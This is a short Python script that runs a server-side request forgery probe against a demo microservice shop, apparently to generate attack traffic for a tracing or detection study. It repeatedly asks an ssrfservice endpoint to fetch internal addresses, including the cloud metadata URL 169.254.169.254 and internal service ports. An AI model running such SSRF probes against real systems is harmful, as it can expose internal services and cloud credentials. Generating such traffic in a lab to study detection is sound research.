# A script for the SSRF attack against Microservice-demo-shop.

import time
import argparse

import requests

# attack surface for SSRF
SSRF_TARGETS = [
    "http://frontend:80/",                        
    "http://authservice:8080/healthz",           
    "http://169.254.169.254/latest/meta-data/",  
    "http://localhost:8080/",                    
    "http://productcatalogservice:3550/",        
]


def main():
    p = argparse.ArgumentParser(description="ShadowTrace SSRF probing attack")
    p.add_argument("--duration", type=int, required=True)
    p.add_argument("--url", default="http://localhost:8082/fetch",
                   help="ssrfservice /fetch endpoint (port-forwarded)")
    p.add_argument("--label", default="ssrf_probe")
    p.add_argument("--pause", type=float, default=0.1)
    args = p.parse_args()

    s = requests.Session()
    start, sent, hits, i = time.time(), 0, 0, 0
    print(f"[ssrf] driving {args.url} with {len(SSRF_TARGETS)} internal targets for {args.duration}s")
    while time.time() - start < args.duration:
        target = SSRF_TARGETS[i % len(SSRF_TARGETS)]  
        i += 1
        try:
            # ask ssrfservice to fetch the target for us - that server-side request
            # is what creates the tell-tale ssrfservice->target edge in the trace
            r = s.get(args.url, params={"url": target}, timeout=6)
            sent += 1
            if r.status_code == 200:
                hits += 1                
        except requests.RequestException:
            pass
        time.sleep(args.pause)
    print(f"[ssrf] done: {sent} SSRF requests in {time.time()-start:.0f}s ({hits} fetched ok)")


if __name__ == "__main__":
    main()
